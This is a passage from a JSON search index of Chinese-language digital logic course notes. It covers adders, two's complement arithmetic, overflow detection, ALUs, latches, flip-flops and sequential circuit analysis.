Functions","text":"<p>\u8ba1\u7b97\u4e3b\u8981\u5305\u62ec\u903b\u8f91\u8fd0\u7b97\u548c\u7b97\u672f\u8fd0\u7b97\uff0c\u524d\u8005\u7531\u4e8e\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u57fa\u672c\u95e8\u5f88\u65b9\u4fbf\u5b9e\u73b0\uff0c\u6240\u4ee5\u6211\u4eec\u4e0d\u8fc7\u591a\u8003\u8651\uff1b\u5728\u6b64\u4e3b\u8981\u4ecb\u7ecd\u7b97\u6570\u8fd0\u7b97\u3002\u5728\u8ba1\u7b97\u673a\u786c\u4ef6\u4e2d\uff0c\u627f\u62c5\u8ba1\u7b97\u5de5\u4f5c\u7684\u4e3b\u8981\u90e8\u4ef6\u4e3a\u00a0<code>ALU</code>(Arithmetic Logical Unit)\u3002</p>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#_2","title":"\u8bde\u751f\u7684\u6761\u4ef6","text":"<p>\u5728Logic Design\u4e2d\uff0c\u4e00\u4e2aArithmetic calculation(e.g. addition &amp; subtraction)\u662f code translation decoder \uff0c\u4f8b\u5982\uff0c\u4e00\u4e2aN-bit\u7684\u4e8c\u8fdb\u5236\u52a0\u6cd5\u9700\u8981\u4e00\u4e2a2N-to-N+1 Decoder</p> <p>\u4f46\u662f\uff0c\u5f53N\u7684\u6570\u91cf\u53d8\u5f97\u5f88\u5927\uff0c\u5efa\u7acb\u8fd9\u4e48\u4e00\u4e2aDecoder\u5c06\u4f1a\u53d8\u5f97\u975e\u5e38\u56f0\u96be\uff0c\u7531\u4e8e\u603b\u5171\u6709 2N \u4e2a\u53d8\u91cf\uff0c\u6211\u4eec\u5efa\u7acb\u7684Truth Table\u5c06\u4f1a\u6709 \\(2^{2N}\\) \u884c\uff01\u8fd9\u662f Designing Impractical \u7684\uff01</p> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u5e0c\u671b\u80fd\u4ece Bisection(\u4e8c\u7b49\u5206) \u8f6c\u53d8\u4e3a Iterative Array .</p>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#iterative-combinational-circuits","title":"Iterative Combinational Circuits","text":"<ul> <li>Cell - subfunction block</li> <li>Iterative array - an array of interconnected cells</li> <li>Arithmetic Functions<ul> <li>Operate on a binary vectors</li> <li>Use the same subfunction in each bit position</li> </ul> </li> </ul>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#function-blocks-addition","title":"Function Blocks : Addition","text":"<p>\u53d1\u5c55\u5386\u7a0b: Half-Adder(HA) \u534a\u52a0\u5668 -&gt; Full-Adder(FA) \u5168\u52a0\u5668 -&gt; Ripple Carry Adder \u884c\u6ce2\u52a0\u6cd5\u5668 -&gt; Carry-Look-Ahead Adder(CLA) \u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668</p> <p>Half-Adder \u534a\u52a0\u5668</p> <p>\u5b9e\u9645\u4e0a\uff0c\u534a\u52a0\u5668\u76f8\u5f53\u4e8e\u4e00\u4e2a 2-to-2 Decoder</p> X Y S(sum) C(carry) 0 0 0 0 0 1 1 0 1 0 1 0 1 1 0 1 <p>\u7ecf\u8fc7\u5361\u8bfa\u56fe\u4f18\u5316\u5f97\u5230:</p> \\[\\begin{gather} S=(X+Y)(\\overline{X}+\\overline{Y})=X\\overline{Y} +\\overline{X}Y=X\\oplus Y \\\\ C=XY \\end{gather} \\] <p>\u534a\u52a0\u5668\u6784\u9020:</p> <p></p> <p>Full-Adder \u5168\u52a0\u5668</p> <p>\u5168\u52a0\u5668\u4e0e\u534a\u52a0\u5668\u7c7b\u4f3c\uff0c\u4f46\u662f\u8fd8\u9700\u8981\u52a0\u4e0a\u4f4e\u4f4d\u8fdb\u4f4d\u6765\u7684 carry-in(Z) \u8fdb\u884c\u52a0\u6cd5\u8fd0\u7b97\u3002</p> <p></p> <p>\u7531\u771f\u503c\u8868\u4ee5\u53ca\u5361\u8bfa\u56fe\u53ef\u4ee5\u5f97\u5230:</p> \\[\\begin{array}l S=X\\overline{Y}\\overline{Z}+\\overline{X}Y\\overline{Z}+\\overline{X}\\overline{Y}Z+XYZ=X\\oplus Y\\oplus Z \\\\  C=XY+XZ+YZ=XY+(X+Y)Z=XY+X\\overline{Y}Z+\\overline{X}YZ=XY+(X\\oplus Y)Z \\end{array} \\] <p>\u5176\u4e2d\u6211\u4eec\u80fd\u53d1\u73b0\u53ef\u4ee5\u590d\u7528\u7684term\uff0c\u5c06\\(XY\\)\u79f0\u4e3acarry generate\uff0c\\(X\\oplus Y\\)\u79f0\u4e3acarry propagate</p> <p>\u5168\u52a0\u5668\u53ef\u4ee5\u7531\u4e24\u4e2a\u534a\u52a0\u5668\u7ec4\u5408\u800c\u6210\uff1a</p> <p></p> <p>Ripple-Carry Binary Adder \u884c\u6ce2\u52a0\u6cd5\u5668</p> <p></p> <p>\u7531\u4e8e\u5168\u52a0\u5668\u7684 Carry-in \u4f9d\u8d56\u4e8e\u524d\u4e00\u4e2a\u5168\u52a0\u5668\u7684\u8f93\u51fa\uff0c\u56e0\u6b64\uff0cRipple-Carry Binary Adder\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u662fLinear (or Big-O n or O(n)) \u7684\uff0c\u8fd9\u4f7f\u5f97\u5176 delay \u7279\u522b\u9ad8\uff0c\u975e\u5e38\u4e0d\u53cb\u597d\u3002</p> <p>\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff0c\u6211\u4eec\u5f15\u5165\u4e86\u4e0b\u4e00\u4e2a\u6982\u5ff5\u3002</p> <p>Carry Lookahead Adder \u8d85\u524d\u8fdb\u4f4d\u52a0\u6cd5\u5668</p> <p>\u6570\u903b\u5bf9\u6b64\u5185\u5bb9\u4e0d\u505a\u8981\u6c42\uff0c\u8865\u5929\u7684\u53ef\u4ee5\u4e0d\u770b\u4e86</p> <p>\u4e3a\u4e86\u63a2\u8ba8S\u3001C\u7684\u5173\u7cfb\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee4 \\(S_i= A_i\\oplus B_i\\oplus C_i= P_i\\oplus C_i\\)\uff0c\\(C_{i+1} =A_i B_i+( A_i\\oplus B_i) C_i= G_i +P_i C_i\\)</p> <p>\u5176\u4e2d\uff0c\\(G_i\\)\u79f0\u4e3a generate function\uff0c\\(P_i\\)\u79f0\u4e3a propagate function\u3002</p> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5c06\\(C_i\\)\u7528\u521d\u59cb\u503c\u8868\u793a\u8fdb\u884c\u8d85\u524d\u8fdb\u4f4d\u6765\u4f7f\u5f97\u65f6\u95f4\u590d\u6742\u5ea6\u4ece \\(O(n)\\) \u53d8\u4e3a \\(O(1)\\)</p> <p></p> <p>\u53ef\u4ee5\u5bf9\u8868\u8fbe\u65b9\u5f0f\u8fdb\u884c\u5316\u7b80</p> <p></p> <p>\u5b9e\u9645\u4f7f\u7528\u8fc7\u7a0b\u4e2d\uff0c \u7531\u4e8e\u95e8\u5177\u6709\u6709\u9650\u7684 fan-in\uff0c\u6211\u4eec\u901a\u5e38\u5c06\u597d\u51e0\u4e2a CLA \u8fdb\u884c\u8fde\u63a5\u6765\u5b9e\u73b0\u529f\u80fd\uff0c\u79f0\u4e3a group carry lookahead \uff0c\u5982</p> <p></p> <p></p> <p></p> <p>Summary</p> <p></p>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#unsigned-subtraction","title":"Unsigned Subtraction","text":"<p>\u57fa\u672c\u601d\u8def:</p> <ul> <li>\u4e24\u4e2a\u4e8c\u8fdb\u5236\u6570\u76f8\u51cf\uff0c\u5982\u679c\u6ca1\u6709\u51fa\u73b0borrow\uff0c\u8bf4\u660e\u7ed3\u679c\u4e3a\u6574\u6570\uff0c\u65e0\u9700\u989d\u5916\u5904\u7406</li> <li>\u82e5\u51fa\u73b0borrow\uff0c\u6211\u4eec\u9700\u8981\u5bf9\u5176\u8fdb\u884c\u4fee\u6b63\uff0c\u5177\u4f53\u4e3a\u7528\\(2^n\\)\u51cf\u53bb\u7ed3\u679c\uff0c\u5e76\u52a0\u4e0a\u8d1f\u53f7</li> </ul> <p>\u3010Example\u3011\uff1a</p> <p></p> <p>Note</p> <p>The subtraction \\(2^n-X\\) is called 2\u2019s complement of X(2\u8fdb\u5236\u8865\u7801\uff0c\u4e0e\u540e\u6587\u7684\u6982\u5ff5\u6709\u6240\u533a\u5206)</p> <p>\u7531\u6b64\u539f\u7406\u5236\u4f5c\u51fa\u6765\u7684\u52a0\u51cf\u6cd5\u5668\u7ed3\u6784\u76f8\u5f53\u590d\u6742\uff0c\u6211\u4eec\u5e0c\u671b\u7531\u4e24\u79cd\u7b97\u6cd5\u5171\u7528\u7684\u903b\u8f91\u6765\u5b8c\u6210\u52a0\u51cf\u6cd5\u64cd\u4f5c:</p> <p></p>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#complement","title":"Complement \u8865\u7801","text":""},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#binary-1s-complement","title":"Binary 1's Complement \u53cd\u7801","text":"<p>\u4f60\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5bf9\u8fd9\u4e2a\u6570\u6309\u4f4d\u53d6\u53cd\u5f97\u5230\u53cd\u7801</p>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#binary-2s-complement","title":"Binary 2's Complement \u8865\u7801","text":"<p>\u4f60\u4e5f\u53ef\u4ee5\u76f4\u63a5\u5bf9\u53cd\u7801\u52a0\u4e00\u5f97\u5230\u8865\u7801</p> <p>\u53e6\u4e00\u79cd\u9002\u7528\u4e8e\u8ba1\u7b97\u673a\u5982\u4f55\u8ba1\u7b97\u8865\u7801\u7684\u65b9\u6848</p> <ul> <li>\u4ece\u6700\u4f4e\u4f4d\u5f00\u59cb\u5411\u524d\u627e\u5230\u7b2c\u4e00\u4e2a1\uff0c\u4fdd\u7559\u7740\u8fd9\u51e0\u4f4d\u7136\u540e\u5bf9\u5269\u4e0b\u4f4d\u6309\u4f4d\u53d6\u53cd\u5f97\u5230\u8865\u7801\uff0c\u8fd9\u6837\u5b50\u9002\u5408\u8ba1\u7b97\u673a\u5904\u7406\u8f83\u5927\u7684\u6570\u636e\u3002</li> <li></li> </ul>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#method-of-complement","title":"Method of Complement","text":"<p>\u5229\u7528\u540c\u4f59\u7684\u601d\u60f3\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u51cf\u6cd5\u8fd0\u7b97\u8f6c\u6362\u4e3a\u52a0\u6cd5\u8fd0\u7b97\u3002</p> <p>\u3010\u540c\u4f59\u3011\uff1a</p> \\[ a\\equiv b\\ \\&amp;\\ c\\equiv d \\Rightarrow a\\pm c\\equiv b\\pm d \\ \\&amp; \\ ac\\equiv bd \\] <p></p> <p></p> <p>carry \u4e3a 1 \u7684\u65f6\u5019\u610f\u5473\u7740\u4e0d\u9700\u8981\u4fee\u6b63\uff0c\u4e3a 0 \u7684\u65f6\u5019\u624d\u8981\u53d6\u8865\u7801\u4fee\u6b63</p> <p>\u76f8\u6bd4\u4e8e\u666e\u901a\u7684 Unsigned Arithmetic \uff0cUnsigned 2's Complement Arithmetic \u5c06 Adder \u548c Substractor \u5408\u5e76\uff0c\u8282\u7701\u4e86\u4f7f\u7528\u3002</p>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#signed-integers","title":"Signed Integers","text":"<p>\u5728\u8ba1\u7b97\u673a\u4e2d\uff0c\u6211\u4eec\u5c06most significant bit\u5b9a\u4e3a\u7b26\u53f7\u4f4d\uff0c\u5176\u4e3a0\u65f6\u4ee3\u8868\u6b63\u6570\uff0c\u4e3a1\u65f6\u4ee3\u8868\u8d1f\u6570</p> \u5bf9\u4e8e\u6709\u7b26\u53f7\u6570\u7684\u52a0\u6cd5\uff0c\u6211\u4eec\u6709\u4e00\u4e0b\u56db\u79cd\u60c5\u666f <p></p> <p></p> <p></p> <p>\u3010\u8f6c\u6362\u89c4\u5219\u3011\uff1a</p> <ul> <li>\u5bf9\u4e8e\u6b63\u6570\uff0c\u4e0d\u53d8\uff1b</li> <li>\u5bf9\u4e8e\u8d1f\u6570\uff0c\u7b26\u53f7\u4f4d\u4e0d\u53d8\uff0c\u5176\u5b83\u4f4d\u53d62's Complement\uff0c\u56e0\u6b64\u5c06\u8865\u7801\u8f6c\u6362\u56de\u8d1f\u6570\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u5148\u518d\u53d62's Complement \uff0c\u7136\u540e\u52a0\u4e0a\u8d1f\u53f7\u3002\u598210011 -&gt; 01101 -&gt; 13 -&gt; -13</li> </ul> <p>\u53e6\u4e00\u79cd\u66f4\u65b9\u4fbf\u7684\u65b9\u6cd5\u662f\u8ba4\u5b9amost significant bit\u662fnegative weight\uff0c\u4f8b\u5982:</p> \\[11111=-2^4 +2^3+ 2^2+ 2^1+ 2^0=-1\\] <p>Sign-Magnitude</p> <p>\u5386\u5e74\u9898\u8003\u8fc7\u6c42\u4e00\u4e2a\u8d1f\u6570\u7684Sign-Magnitude(\u539f\u7801)\uff0c\u8981\u8bb0\u6e05\u695a\u6982\u5ff5</p> <p>\u5bf9\u4e8enagative weighting\u7684\u8865\u7801\uff0c\u6211\u4eec\u5bf9\u5176\u8fdb\u884c sign extension \u5e76\u4e0d\u4f1a\u6539\u53d8\u5176\u503c</p> <p></p> <p>\u3010\u6709\u7b26\u53f7\u8865\u7801\u8fd0\u7b97\u89c4\u5219\u3011\uff1a</p> <ul> <li>\u65e0\u8bba\u662f\u52a0\u6cd5\u8fd8\u662f\u51cf\u6cd5\uff0c\u5c06\u5143\u7d20\u8f6c\u6362\u6210\u8865\u7801\u8fdb\u884c\u8868\u793a\uff1b</li> <li>\u5982\u679c\u662f\u51cf\u6cd5\uff0c\u6211\u4eec\u5c06\u51cf\u6389\u7684\u6570\u8f6c\u6362\u6210complement(\u6307Unsigned\u4e2d\u6240\u8bf4\u7684Complement)\uff0c\u7136\u540e\u8fdb\u884c\u52a0\u6cd5\u8fd0\u7b97\u3002\u7136\u540e\u5ffd\u7565\u591a\u51fa\u7684carry out\u3002\u5982:<ul> <li></li> </ul> </li> </ul> <p>\u5728\u8865\u7801\u8fd0\u7b97\u4e2d\uff0c\u6709carry out\u4e0d\u4ee3\u8868\u8be5\u7b97\u5f0foverflow\u4e86\uff0c\u53ea\u6709\u5f53\u4e24\u4e2a\u64cd\u4f5c\u6570\u7684\u7b26\u53f7\u4f4d\u76f8\u540c\u4e14\u4e0e\u7ed3\u679c\u7684\u7b26\u53f7\u4f4d\u4e0d\u540c\u65f6\uff0c\u624d\u6709overflow\u53d1\u751f(\u7b80\u5355\u601d\u8003\uff0c\u5c31\u662f\u6b63\u6570\u52a0\u6b63\u6570\u51fa\u73b0\u8d1f\u6570\uff0c\u6216\u8005\u8d1f\u6570\u52a0\u8d1f\u6570\u51fa\u73b0\u6b63\u6570\uff0c\u8bf4\u660e\u53d1\u751f\u4e86overflow)</p> <p>\u6839\u636e\u4e0a\u8ff0\u539f\u7406\uff0c\u6211\u4eec\u53ef\u4ee5\u7ed9\u6bcf\u4e2aB\u52a0\u4e0a\u4e00\u4e2a\u5f02\u6216\u95e8\u6765\u64cd\u63a7\u662f\u5e94\u7528\u52a0\u6cd5 (0) \u8fd8\u662f\u51cf\u6cd5 (1)</p> <p></p> <p>\u5f53\u5e94\u7528\u51cf\u6cd5\u7684\u65f6\u5019\uff0c\\(C_0\\) \u8981\u7f6e 1\uff0c\u6240\u4ee5\u6211\u4eec\u5c06 \\(S\\) \u63a5\u5165 \\(C_0\\)</p> <p>\u5982\u679c\u6211\u4eec\u5e0c\u671b\u7528\u4e00\u79cd\u66f4\u4e3a\u7406\u5316\u7684\u601d\u60f3\u6765\u68c0\u6d4b\u662f\u5426overflow\uff0c\u53ef\u4ee5\u5148\u8ba4\u5b9a \\(X_{k-1}\\) \u4e3a\u64cd\u4f5c\u6570A\u7684\u7b26\u53f7\u4f4d\uff0c\\(Y_{k-1}\\) \u4e3a\u64cd\u4f5c\u6570B\u7684\u7b26\u53f7\u4f4d\uff0c\\(S_{k-1}\\) \u4e3a\u7ed3\u679c\u7684\u7b26\u53f7\u4f4d\uff0c\u5219 \\(V=X_{k-1} Y_{k-1}\\overline {S_{k-1}}+\\overline {X_{k-1}}\\overline {Y_{k-1}} S_{k-1}\\)</p> <p>\u66f4\u52a0\u7b80\u5316\u8fd9\u4e2a\u5f0f\u5b50\uff0c\u53ef\u4ee5\u76f4\u63a5\u8ba4\u5b9a \\(V=C_{k-1} \\oplus C_{k-2}\\)</p> <p></p> <p>\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ea\u9700\u8981\u5c06\u6700\u540e\u4e24\u4e2acarry out\u7528\u5f02\u6216\u95e8\u8fde\u63a5\u8d77\u6765\u5c31\u53ef\u4ee5\u5f97\u5230V:</p> <p></p> <p>Summary</p> <p></p>"},{"location":"Courses/DD/note/Chapter%203%20Combinational%20Logic%20Design/#arithmetic-logic-unit-alu","title":"Arithmetic Logic Unit (ALU)","text":"<p>\u3010Specification\u3011\uff1a</p> <ul> <li>two n-bit input : \\(A_0- A_{n-1}, B_0- B_{n-1}\\)</li> <li>mode selection : arithmetic/logical</li> <li>operation selection :  add/sub/inc/dec or and/or/not/xor</li> <li>1-bit carry input and carry output</li> </ul> \u4e00\u4e2a\u7b80\u5355\u7684\u903b\u8f91ALU\u4e00\u4e2a\u7b80\u5355\u7684\u7b97\u6570ALU <p></p> <p></p> <p>\u8bf7\u6ce8\u610f\uff0cY = 1 \u6307\u6240\u6709\u4f4d\u5747\u4e3a 1\uff0c\u56e0\u6b64 \\(G=A+2^n-1=A-1\\) </p>"},{"location":"Courses/DD/note/Chapter%204%20Sequential%20Circuits/","title":"CH 4. Sequential Circuits","text":""},{"location":"Courses/DD/note/Chapter%204%20Sequential%20Circuits/#chapter-4-sequential-circuits","title":"Chapter 4 Sequential Circuits","text":"<p> \u7ea6 2260 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p>"},{"location":"Courses/DD/note/Chapter%204%20Sequential%20Circuits/#part-1-storage-elements-and-sequential-circuit-analysis","title":"Part 1 Storage Elements and Sequential Circuit Analysis","text":""},{"location":"Courses/DD/note/Chapter%204%20Sequential%20Circuits/#introduction-of-sequential-circuits","title":"Introduction of Sequential Circuits \u65f6\u5e8f\u7535\u8def\u7684\u4ecb\u7ecd","text":"<p>\u4e00\u4e2a\u65f6\u5e8f\u7535\u8def\u5305\u542b:</p> <ul> <li>Storage Elements:<ul> <li>Latches or Flip-Flops \u9501\u5b58\u5668\u6216\u89e6\u53d1\u5668</li> </ul> </li> <li>Combinational Logic </li> </ul> <p></p> <p>\u65f6\u5e8f\u7535\u8def\u7684\u79cd\u7c7b:</p> <ul> <li>Synchronous \u540c\u6b65\u65f6\u5e8f\u7535\u8def<ul> <li>\u6839\u636e\u65f6\u949f\u4fe1\u53f7\u7684\u53d8\u5316\u6765\u66f4\u65b0\u8f93\u51fa\u7684\u503c \u66f4\u52a0\u53ef\u63a7</li> </ul> </li> <li>Asynchronous \u5f02\u6b65\u65f6\u5e8f\u7535\u8def<ul> <li>\u6bcf\u5f53\u8f93\u5165\u7684\u72b6\u6001\u6539\u53d8\uff0c\u7acb\u523b\u66f4\u65b0\u8f93\u51fa\u7684\u503c \u53d8\u5316\u66f4\u5feb</li> </ul> </li> </ul>"},{"location":"Courses/DD/note/Chapter%204%20Sequential%20Circuits/#_1","title":"\u9501\u5b58\u5668","text":"<p>Latch \u7684\u6761\u4ef6</p> <ol> <li>\u62e5\u6709\u4e24\u4e2a\u7a33\u5b9a\u7684\u72b6\u6001\uff0c0\u548c1</li> <li>\u80fd\u591f\u957f\u65f6\u95f4\u7ef4\u6301\u7a33\u5b9a\u6001</li> <li>\u5728\u7279\u5b9a\u7684\u60c5\u51b5\u4e0b\u80fd\u591f\u6539\u53d8\u72b6\u6001</li> </ol> S'R'\u9501\u5b58\u5668SR\u9501\u5b58\u5668 <p></p> <p></p> <p>\u4e8c\u8005\u7684\u5171\u540c\u70b9\u662f\u5f53S\u7f6e1\u7684\u65f6\u5019\uff0cQ\u4f1a\u53d8\u62101(\u6ce8\u610fS'R'\u9501\u5b58\u5668 S\u7f6e1\u7684\u65f6\u5019\u5b9e\u9645\u4e0a\u8f93\u5165\u4e86S'=0)</p> <p>\u901a\u8fc7\u52a0\u4e0a\u65f6\u949f\u4fe1\u53f7\u4f5c\u4e3a\u4f7f\u80fd\uff0c\u53ef\u4ee5\u7ec4\u6210Synchronous\u7684\u95e8\u63a7\u9501\u5b58\u5668 Clocked S-R Latch</p> <p></p> <p>\u4ee5\u4e0a\u4e24\u79cd\u9501\u5b58\u5668\u90fd\u5b58\u5728\u4e00\u4e2a\u95ee\u9898\uff0c\u5c31\u662f\u5bf9\u4e8eS/R\u67d0\u79cd\u8f93\u5165\u5b58\u5728\u4e0d\u786e\u5b9a\u72b6\u6001\uff0c\u5e76\u6709\u53ef\u80fd\u4ea7\u751f\u4ecb\u7a33\u6001(metastable state)</p> metastable state <p></p> <p>\u4e3a\u4e86\u6d88\u9664\u8fd9\u79cd\u4e0d\u786e\u5b9a\uff0c\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\u9650\u5b9a\u9501\u5b58\u5668\u7684\u8f93\u5165\u72b6\u6001\uff0c\u7531\u6b64\u6784\u6210\u4e86 D-Latch</p> <p></p> C D Q(t+1) 0 X No change 1 0 0: Clear Q 1 1 1: Set Q <p>\u53ea\u6709\u5f53 C \u4e3a1\u65f6\uff0cD\u9501\u5b58\u5668\u624d\u80fd\u5199\u5165\u6570\u636e\uff1b\u800c\u5f53 C \u4e3a0\u65f6\uff0cD\u9501\u5b58\u5668\u7684\u6570\u636e\u4e0d\u4f1a\u53d8\u5316</p> <p>Transparennt</p> <p>\u5728\u5b9e\u9645\u4f7f\u7528\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u80fd\u4f1a\u9047\u5230\u4e00\u4e2astorage element\u8fde\u63a5\u5230\u53e6\u4e00\u4e2astorage element\uff0c\u7136\u540e\u53e6\u4e00\u4e2astorage element\u53c8\u91cd\u65b0\u8fde\u63a5\u56de\u539f\u6765\u7684storage element\uff0c\u5373\u5728combinational logic\u4e2d\u4e00\u4e2astorage element\u7684\u8f93\u5165\u8f93\u51fa\u53ef\u80fd\u4f1a\u76f8\u8fde\u3002</p> <p>\u4f46\u662f\u5982\u679c\\(\\overline{Q}\\)\u4e0eD\u76f8\u8fde\uff0c\u5728clock\u65f6\u949f\u4fe1\u53f7\u6709\u6548\u7684\u65f6\u95f4\u5185\uff0cQ\u7684\u503c\u53ef\u80fd\u4f1a\u591a\u6b21\u53d8\u5316\uff0c\u5bfc\u81f4\u6211\u4eec\u65e0\u6cd5\u786e\u5b9aC\u7f6e0\u65f6Q\u7684\u8f93\u51fa\u662f\u4ec0\u4e48\u3002\u8fd9\u5c31\u662f\u6211\u4eec\u5e38\u8bf4\u7684\u7a7a\u7ffb\u73b0\u8c61</p>"},{"location":"Courses/DD/note/Chapter%204%20Sequential%20Circuits/#_2","title":"\u89e6\u53d1\u5668","text":"<p>\u4e3a\u89e3\u51b3\u4e0a\u8ff0\u7a7a\u7ffb\u95ee\u9898\uff0c\u6211\u4eec\u5f15\u5165\u89e6\u53d1\u5668</p> <ul> <li>Master-Slave flip-flops \u4e3b\u4ece\u89e6\u53d1\u5668</li> <li>Edge-triggered flip-flops  \u8fb9\u7f18\u89e6\u53d1\u89e6\u53d1\u5668</li> </ul> <p>SR\u4e3b\u4ece\u89e6\u53d1\u5668</p> <p></p> <p>\u8fd9\u6837\u5b50\u5f53C\u7f6e0\u65f6\uff0cSlave\u4eceMaster\u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u800cMaster\u7684\u6570\u636e\u662f\u56fa\u5b9a\u4e0d\u53d8\u7684\uff0c\u4e0d\u4f1a\u4ea7\u751f\u53d8\u5316</p> <p>\u4f46\u662f\u5176\u5b9e\u4e3b\u4ece\u89e6\u53d1\u5668\u4ecd\u7136\u5b58\u5728\u95ee\u9898\uff0c\u5f53S\u548cR\u5747\u7f6e0\u65f6\uff0c\u5982\u679c\u51fa\u73b00-1-0glitch(S\u6216R\u8f93\u5165\u77ed\u6682\u8df3\u4e3a1)\uff0c\u4f1a\u5bfc\u81f4Slave\u5199\u5165\u5f02\u5e38\u6570\u636e\uff0c\u8fd9\u88ab\u79f0\u4e3a1s-catching\u3002</p> <p>\u4e3a\u4e86\u907f\u514d1s-catching\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fb9\u7f18\u89e6\u53d1\u89e6\u53d1\u5668\uff0c\u5b83\u53ea\u4fdd\u5b58\u4e86\u7535\u4f4d\u53d8\u5316\u77ac\u95f4\u7684\u90a3\u4e2a\u6570\u636e\uff0c\u5927\u5927\u51cf\u5c0f\u4e86\u5371\u5bb3\u3002</p> Negative-Edge-Triggered D Flip-FlopPositive-Edge-Triggered D Flip-Flop <p> </p> <p> </p> <p>Tip</p> <p></p> <p>Simpler Implement of Edge-Triggered D Flip-Flop</p> <p></p>"},{"location":"Courses/DD/note/Chapter%204%20Sequential%20Circuits/#flip-flop-timing-parameters","title":"Flip-Flop Timing Parameters","text":"<ul> <li>\u4e3a\u4e86\u4fdd\u8bc1\u6570\u636e\u80fd\u591f\u6210\u529f\u5b58\u50a8\u5728\u89e6\u53d1\u5668\u4e2d\uff0c \u5728\u8fb9\u6cbf\u89e6\u53d1\u524d\u9700\u8981\u6709\u4e00\u5c0f\u6bb5Setup time (\\(t_s\\))</li> <li>\u4e3a\u4e86\u4fdd\u8bc1\u6570\u636e\u80fd\u591f\u5728\u89e6\u53d1\u540e\u7a33\u5b9a\u4fdd\u6301\u5e76\u7531\u65f6\u949f\u4fe1\u53f7\u53d6\u6837\uff0c\u5728\u8fb9\u6cbf\u89e6\u53d1\u540e\u9700\u8981\u7531\u4e00\u5c0f\u6bb5Hold time (\\(t_h\\))</li> <li>\u4e8c\u8005\u5408\u8d77\u6765\u79f0\u4e3aFlip-Flop\u7684Setup hold window\uff0c\u8fd9\u6bb5\u65f6\u95f4\u9700\u8981\u4fdd\u8bc1\u6570\u636e\u662f\u7a33\u5b9a\u7684</li> </ul> <p>\u4e3b\u4ece\u89e6\u53d1\u5668\u548c\u8fb9\u6cbf\u89e6\u53d1\u5668\u5bf9\u6bd4</p> <p>\u5bf9\u6bd4\u53d1\u73b0\uff0c\u4e3b\u4ece\u89e6\u53d1\u5668\u8981\u6c42C\u4e3a1\u65f6\u8f93\u5165\u5168\u7a0b\u4fdd\u6301\u7a33\u5b9a\uff0c\u800c\u8fb9\u6cbf\u89e6\u53d1\u5668\u53ea\u8981\u5728\u8fb9\u6cbf\u524d\u4e00\u5c0f\u6bb5\u65f6\u95f4\u4fdd\u6301\u7a33\u5b9a\u5373\u53ef</p> <p></p>"},{"location":"Courses/DD/note/Chapter%204%20Sequential%20Circuits/#sequential-circuit-analysis","title":"Sequential Circuit Analysis","text":"<p>\u4e3b\u8981\u5305\u62ec\uff1a</p> <ul> <li>Generating the functionality by using state table , state diagram , input/output Boolean equations .</li> <li>Determining the timing constraints that a sequential circuit must ba satisfied in order to prevent metastability .</li> </ul>"},{"location":"Courses/DD/note/Chapter%204%20Sequential%20Circuits/#_3","title":"\u5206\u6790\u529f\u80fd","text":"<ul> <li>Step 1 \u5217\u51fa <code>input equations</code> , <code>next state equations</code> and <code>output equations</code></li> </ul> <ul> <li>Step 2 \u6839\u636e\u7b49\u5f0f\u5217\u51fa <code>State Table</code></li> </ul> \u6df3\u6734\u65e0\u5947\u7684\u5217\u8868(\u4e0d\u63a8\u8350)\u91c7\u7528\u683c\u96f7\u7801\u7684\u4e8c\u7ef4\u8868\uff0c\u4fbf\u4e8e\u4f18\u5316(\u63a8\u8350) <ul> <li>Step 3 \u753b\u51fa <code>State Diagram</code></li> </ul> <p>\u5982\u679c\u5b58\u5728\u4e24\u4e2a\u72b6\u6001\uff0c\u5f53\u4ed6\u4eec\u5bf9\u4e8e\u76f8\u540c\u7684\u8f93\u5165\uff0c\u8f93\u51fa\u5747\u76f8\u540c\u4e14\u8f6c\u79fb\u5230\u76f8\u540c\u7684\u72b6\u6001\uff0c\u5219\u8fd9\u4e24\u4e2a\u72b6\u6001\u662f equivalent \u7684\uff0c\u9700\u8981\u6211\u4eec\u624b\u52a8\u4f18\u5316\u3002</p> <p>\u5386\u5e74\u5377\u91cc\u7684\u5947\u602a\u9898\u76ee</p> <p> \u6ce8\u610f\uff0c\u5982\u679c\u53ea\u7ed9\u4e86\u65f6\u5e8f\u7535\u8def\u7684\u6ce2\u5f62\u56fe\uff0c\u6ce8\u610f\u533a\u522b\u5176\u4e0e\u7ec4\u5408\u7535\u8def\u7684\u533a\u522b: \u65f6\u5e8f\u7535\u8def\u7684\u72b6\u6001(\u5305\u62ec\u5185\u90e8\u4e0e\u5916\u90e8)\u5728\u6bcf\u6b21\u65f6\u949f\u6b63\u8fb9\u6cbf\u7684\u65f6\u5019\u90fd\u4f1a\u6539\u53d8!\u56e0\u6b64\u4e0a\u56fe\u4e00\u8f6e\u5faa\u73af\u5171\u6709\u516b\u4e2a\u72b6\u6001\u800c\u4e0d\u662f\u56db\u4e2a</p> \u8bfe\u672c\u91cc\u7684\u5947\u602a\u9898\u76ee\u7b54\u6848 <p> \u5206\u6790: \u9898\u76ee\u8bf4 <code>Their transitions always appear in the order shown in 